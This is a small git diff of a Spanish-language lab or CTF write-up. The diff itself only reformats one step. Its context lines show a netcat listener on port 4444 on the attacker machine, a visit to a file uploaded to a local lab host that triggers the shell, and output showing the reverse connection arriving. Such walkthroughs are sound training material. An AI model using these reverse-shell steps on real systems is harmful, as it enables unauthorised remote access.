@@ -184,8 +184,12 @@ Ponemos un `listener` en nuestra máquina atacante.
 sudo nc -nlvp 4444
 ```
 
-Navegamos a la ruta donde se ha subido el archivo:`http://172.17.0.2/themes/uploads/69933be14a98c.jpg`.
+Navegamos a la ruta donde se ha subido el archivo: 
+```
+http://172.17.0.2/themes/uploads/69933be14a98c.jpg
+```
 
+Info:
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 46246
